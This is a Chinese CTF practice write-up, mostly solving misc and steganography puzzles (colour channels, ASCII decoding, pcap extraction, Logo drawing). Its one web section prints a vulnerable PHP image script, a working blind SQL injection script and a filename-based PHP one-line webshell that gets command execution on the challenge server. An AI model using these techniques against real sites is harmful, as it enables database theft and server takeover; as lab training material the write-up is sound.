---
typora-root-url: images
---

## 前言

​	准备一下国赛，所以刷了很多misc(因为misc手及其缺人),so没有怎么学web。

​	还有打了pycc，主要做了misc和两道web就不贴wp了。

## [CISCN2019 总决赛 Day2 Web1]Easyweb 

访问是一个登陆界面，访问robots.txt 

![image](https://user-images.githubusercontent.com/81904597/117298376-e33c0680-aea9-11eb-9342-ba0f7bfb78d9.png)

我们尝试访问User.php.bak，500，访问image.php.bak，下载php文件 

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
函数返回在预定义字符之前添加反斜杠的字符串。预定义的字符有：单引号，双引号，反斜杠，NULL
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

盲注得到username和password 

```python
import requests

url = "http://04c4f002-4712-444e-bbb6-f690232960d3.node3.buuoj.cn/image.php"
result = ''

for i in range(0, 30):
    right = 127
    left = 32
    mid = int((right + left) >> 1)
    while right > left:
        payload = " or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))>%d,1,0)#" % (i, mid)
        params = {
            'id': '\\0',
            'path': payload
        }
        response = requests.get(url, params=params)

        if "JFIF" in response.text:
            left = mid + 1
        else:
            right = mid
        mid = int((right + left) >> 1)

    result += chr(mid)
    print(result)
```

登陆后进入一个文件上传界面， 

```
上传一个shell发现他是对文件名过滤，如果文件名里出现php就会报错。
上传一个正常图片，然后告诉我把文件名记录在日志里。因为是把文件名保存到日志中，而且日志文件是php，所以直接利用文件名写shell，把文件名改成一句话木马。
PHP开启短标签即short_open_tag=on时，可以使用输出变量。我们抓包将文件名改为<?=$_GET['cmd']; ?>
```

![image](https://user-images.githubusercontent.com/81904597/117298465-f9e25d80-aea9-11eb-8fd2-7af5f4830d0e.png)
根目录拿到flag 

## 很好的色彩呃？ 

下载后是一张gif的图片,图片本身有留个不同的颜色，qq截图时按住crtl可以查看色道 

![image](https://user-images.githubusercontent.com/81904597/117298525-0a92d380-aeaa-11eb-9864-3ae2fa70c832.png)


```
#8B8B61
#8B8B61
#8B8B70
#8B8B6A
#8B8B65
#8B8B73
```

只有后两位不同，提取后两位转字符串即可

```
flag{aapjes}
```

 ## key不在这里

二维码扫码,是一个连接，访问下 

```
https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&qs=n&form=QBRE&sp=-1&sc=0-38&sk=&cvid=2CE15329C18147CBA4C1CA97C8E1BB8C
```

![image](https://user-images.githubusercontent.com/81904597/117298577-1aaab300-aeaa-11eb-8443-b78ec6a08a04.png)


可以看到url里藏了一堆ascii码,尝试转换 

```python
text='10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568'
flag=''
i = 0
while(i < len(text)):
    if(int(text[i:i+3]) < 127):
        flag +=chr(int(text[i:i+3]))
        i+=3
    else:
        flag +=chr(int(text[i:i+2]))
        i+=2
print(flag)

#flag{5d45fa256372224f48746c6fb8e33b32}
```

## [INSHack2018]Self Congratulation 

图片的左上角有一块东西 

![image](https://user-images.githubusercontent.com/81904597/117298637-2d24ec80-aeaa-11eb-8c0c-7c469e9e1404.png)


``` 
00110001001
10010001100
11001101000
01101010011
01100011011
10011100000
```

![image](https://user-images.githubusercontent.com/81904597/117298638-2d24ec80-aeaa-11eb-9297-ac3de880558e.png)


## [ACTF新生赛2020]frequency 

word里隐藏字体,感觉是base但是解密后就卡住了 

![image](https://user-images.githubusercontent.com/81904597/117298681-3a41db80-aeaa-11eb-9f11-5ef417fb9461.png)


 看wp，在详细信息里还有一部分，合起来base解密,然后词频分析拿到flag 
![image](https://user-images.githubusercontent.com/81904597/117298704-4168e980-aeaa-11eb-9c35-a887c69b0f78.png)


词频分析:<http://www.aihanyu.org/cncorpus/CpsTongji.aspx> 

```
flag{plokmijnuhbygvrdxeszwq}
```

## [MRCTF2020]摇滚DJ（建议大声播放)

无线电

```
flag{r3ce1ved_4n_img}
```

## [SCTF2019]Ready_Player_One 

![image](https://user-images.githubusercontent.com/81904597/117298738-4b8ae800-aeaa-11eb-8f9a-19bb71225d78.png)


## [INSHack2019]gflag 

打开文件是G语言，使用在线网站解密 

![image](https://user-images.githubusercontent.com/81904597/117298785-56de1380-aeaa-11eb-81db-2a7a856d49a4.png)


在线网站:<https://ncviewer.com/> 

![image](https://user-images.githubusercontent.com/81904597/117298811-5f364e80-aeaa-11eb-9880-9bbca72e866b.png)

```
flag{3d_pr1nt3d_fl49}
```

## [QCTF2018]X-man-Keyword 

图片直接给了一个密码，通过stegsolve查看各个通道，发现每个色道的0通道都隐藏了信息，那肯定就是Lsb加密，使用lsb.py解密，目前库不行解密不出来得到 

```
PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}
```

根据题目提示为`Nihilist 密码` 26个英文字母为ABCDEFGHIJKLMNOPQRSTUVWXYZ把关键字提前后为LOVEKFCABDGHIJMNPQRSTUWXYZ在置换后的序列里可以发现对应关系P=Q，V=C，S=T，F=F。。。。。使用脚本解密 

```python
import string
 
enc='PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}'
grid='LOVEKFC'+'ABDGHIJMNPQRSTUWXY'
flag=''
 
for i in enc:
    if i in string.ascii_lowercase:
        index=grid.lower().index(i)
        flag+=string.ascii_lowercase[index]
        continue
    if i in string.ascii_uppercase:
        index=grid.upper().index(i)
        flag+=string.ascii_uppercase[index]
        continue
    flag+=i
print flag

flag{cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf}
```

## [INSHack2017]hiding-in-plain-sight 

foremost 分离之 

```
flag{l337_h4xx0r5_c0mmun1c473_w17h_PNGs}
```

## [DDCTF2018]第四扩展FS 

图片里藏了个压缩包，属性里有压缩包的密码txt里有很多重复的数据，猜测为词频分析 

```python
# -*- coding: utf-8 -*-
from collections import Counter
 
f=open('file.txt','r')
f_read=f.read()
print Counter(f_read)
```
![image](https://user-images.githubusercontent.com/81904597/117298883-71b08800-aeaa-11eb-83d3-7c22e47c8ea3.png)


```
flag{huanwe1sik4o!}
```

## 蜘蛛侠呀
参考大佬博客:https://blog.csdn.net/qq_51090016/article/details/115712647
经过测试发现，在每个ICMP包里，的data里都有一部分字符串
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042517001488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3ODg2OTA1,size_16,color_FFFFFF,t_70)
使用tshark将其提取出来
```
tshark -r out.pcap -T fields -e data > data.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425170137266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3ODg2OTA1,size_16,color_FFFFFF,t_70)
提取出来之后发现有空行，并且有重复的部分，然后我们尝试去除。
```python
with open('data.txt', 'r') as file:
    res_list = []
    lines = file.readlines()
    print('[+]去重之前一共{0}行'.format(len(lines)))
    print('[+]开始去重，请稍等.....')
    for i in lines:
        if i not in res_list:
            res_list.append(i)
    print('[+]去重后一共{0}行'.format(len(res_list)))
    print(res_list)

with open('data1.txt', 'w') as new_file:
    for j in res_list:
        new_file.write(j)
```
然后十六进制转字符串
```python
import binascii

with open('data1.txt','r') as file:
    with open('data2.txt','wb') as data:
        for i in file.readlines():
            data.write(binascii.unhexlify(i[:-1]))

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425174520833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3ODg2OTA1,size_16,color_FFFFFF,t_70)

转换完成之后，里面有很多多余的东西,利用记事本记事本将$$这些替换掉，在用python脚本去重空行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425174742187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3ODg2OTA1,size_16,color_FFFFFF,t_70)
```python
lines = open("C:/Users/86189/Desktop/2/data4.txt",'rb').readlines()
files = open("C:/Users/86189/Desktop/2/data6.txt","wb")
for line in lines:
files.write(line.strip())
files.close()
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425174921351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3ODg2OTA1,size_16,color_FFFFFF,t_70)这样就去除掉空行了,然后再base64转图片
```python
with open('C:/Users/86189/Desktop/2/data6.txt','rb') as file:
    with open('C:/Users/86189/Desktop/2/res2.zip','wb') as new_file:
        new_file.write(base64.b64decode(file.read()))
```
得到一张gif图片,考察基于时间的隐写，可使用Identify提取
```
identify -format “%T” flag.gif
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425175609528.png)
然后把20和50替换成01
```
011011010100010000110101010111110011000101110100
```
二进制转字符串,再转一下md5拿到flag
```python
import re
s = '011011010100010000110101010111110011000101110100'
r = re.findall(r'.{8}',s)
rea = ''
for i in r:
    rea += chr(int(i,2))
print(rea)
rea = hashlib.md5(rea.encode('utf-8')).hexdigest()
print(rea)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425182830705.png)
```
flag{f0f1003afe4ae8ce4aa8e8487a8ab3b6}
```
## [RCTF2019]draw
下载文档,明显是在画什么东西
```
cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home
```
使用[此网站](https://www.calormen.com/jslogo/)解密，拿到flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425183859819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3ODg2OTA1,size_16,color_FFFFFF,t_70)
```
flag{RCTF_HeyLogo}
```
## [MRCTF2020]不眠之夜
这题曾经做过,这里只贴一下命令，(不要问我为什么不再做一遍，因为gaps坏了)
```
montage *jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg
gaps --image=flag.jpg --generations=40 --population=120 --size=100
```
